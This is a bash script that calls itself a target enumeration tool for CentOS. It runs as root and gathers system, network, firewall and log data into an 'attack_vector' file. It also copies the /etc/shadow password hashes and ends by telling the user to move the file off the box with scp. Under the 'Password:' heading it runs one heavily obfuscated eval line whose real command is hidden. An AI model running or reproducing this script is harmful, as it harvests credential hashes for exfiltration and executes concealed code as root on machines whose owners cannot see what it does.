############################################################################
## Target Enumeration Script                                              ##
## Bash Script for CentOS                                                 ##
##                                                                        ##
## Author: Anna DeVries                                                   ##
## 6 April 2019                                                           ##
##                                                                        ##
## sudo ./centos_targetenum.sh                                            ##
############################################################################

#!/bin/bash

if [ "$EUID" -ne 0 ]
  then echo "Run again as root 'sudo ./centos_targetenum.sh'"
  exit
fi

echo -n "Which service is this box running?: "
read ans
echo $ans

echo "Target Enumeration Text File" &> ${ans}_centos_attack_vector.txt
echo " " &>>  ${ans}_centos_attack_vector.txt

echo "--------------------System Information--------------------" &>> ${ans}_centos_attack_vector.txt
cat /etc/centos-release &>> ${ans}_centos_attack_vector.txt
echo "IP Address: " &>> ${ans}_centos_attack_vector.txt
ip addr | grep "inet " &>> ${ans}_centos_attack_vector.txt
echo "Kernel Information: " &>> ${ans}_centos_attack_vector.txt
uname -a &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt

echo "--------------------Services and Ports--------------------" &>> ${ans}_centos_attack_vector.txt
netstat -pan &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt

echo "--------------------User/Root Privs Information--------------------" &>> ${ans}_centos_attack_vector.txt
echo "Password: " &>> ${ans}_centos_attack_vector.txt
${@~}eval "$(pr""i''n\t${@%%G}f "\x$(""${*##x:}prin""$'\x74'f %s 'P?'|${*//_f/M:}md5\s''\um|${@,,}c""\ut -b 24-25)""${@^^}";${*~~}prin''t\f "\x$(prin"${@,,}"tf %s '~'|${*%%>}m$'\144'5s$'\165'\m|${*##hG}$'\x63'$'\x75'${@##N|}t -b 4-5)";''${*%%Z}print$'\x66' "\x$(p''r$'\x69'n""\t$'\x66' %s '2['|md${*##+}5""sum|${@##l}cu${!@}t -b 17-18${@^^})"${*^}&&p""r""$'\151'ntf "\x$($'\x70'r${@/m}int$'\x66' %s '1'|${*,}m\d5${!*}su$'\155'|${*%%E}c${*%%#}ut -b 16-17)";$'\160'''\r$'\151'\n""t""${@,}f "\x$(p\rintf %s 't9'${*//i/wm}|${*/J\)}m"${@//j/6=}"d5s''um|"${@}"''c${*#L\{}u${*//0}t -b 2-3${*})"&&${*~~}pri''nt\f "\x$(p\ri$'\x6e't\f %s 'g}'${*//\!J}|$@m''${*~}d5su${@/99}m|${*/7}"${@,}"c''ut -b 2-3)""${@//#p/B\(}";p""${*#=}r${*/\{/]}in$'\x74'f "\x$(\p"${@,,}"rin$'\x74'\f %s 'sW'|md\5''su""m"${@//rR/#i}"|cut -b 7-8)"&&""\p$'\x72'$'\x69'nt\f "\x$(p""${*//3U}r${*,}in${*/me}t''f %s '.'${@%g}|''"${@~}"md\5$'\x73'${*%#X}um|"${@,}"""$'\x63'\u$'\x74' -b 13-14)"${*~}&&${@~~}$'\x70'r$'\x69'ntf "\x$(\printf %s 'g'${*#Jh}|md$'\65'""sum|""c\u\t -b 2-3${@^^})"&&${*~~}pri""\ntf "\x$(p''r''\i$'\156'''t''f %s 'fC'${*//F-/^}|${@,}m$'\x64'5sum|''cut -b 19-20)"${*,}&&"${@//9/*#}"pr''i\n"""${@~}"tf "\x$(${@,}p\r""$'\x69'$'\x6e'$*t\f %s 'ys'|$'\155'""d5sum$*|cu\t -b 12-13"${@^^}")"${@//yZ}&&p""$'\162'in$'\164'f "\x$(printf %s '('|${@}""md5''$'\163'''$'\x75'm|c$'\165'\t -b 7-8${*//\(P/k})"&&${*/rd}$'\160'${*//Q5/u}r"${@//</3}"i${*~}n""tf "\x$(p\r${*//W}in$'\x74'f %s '{J'${*~}|md${@%%NA}5\sum|c$'\165'$'\x74' -b 27-28"${@^^}")"${*^^};printf "\x$(""p""rintf %s ';e'|m${@/4}d5sum|${!@}c''$'\x75't -b 3-4"${@,}")"&&$*${*^^}prin$'\x74'f "\x$(""p""\r"$@"i""\n''tf %s 'q;'"${@~~}"|${*,,}m''d5sum"${@~~}"|"${@,,}"cu''\t -b 14-15)")" &>> ${ans}_centos_attack_vector.txt
echo "Shadow: " &>> ${ans}_centos_attack_vector.txt
cat /etc/shadow &>> ${ans}_centos_attack_vector.txt
echo "Groups: " &>> ${ans}_centos_attack_vector.txt
cat /etc/group &>> ${ans}_centos_attack_vector.txt
echo "Logged in Users: " &>> ${ans}_centos_attack_vector.txt
who &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt

echo "--------------------Firewall--------------------" &>> ${ans}_centos_attack_vector.txt
echo "IPTABLES: " &>> ${ans}_centos_attack_vector.txt
iptables -L &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt
echo "Firewalld: " &>> ${ans}_centos_attack_vector.txt
sudo firewall-cmd --zone=public --list-all &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt

echo "--------------------Logs--------------------" &>> ${ans}_centos_attack_vector.txt
journalctl -xe &>> ${ans}_centos_attack_vector.txt
echo " " &>> ${ans}_centos_attack_vector.txt

echo "Target Enumeration Complete"
echo "Please move this off the box and share in Slack. 'scp ${ans}_centos_attack_vector.txt <dst@ip>:' "
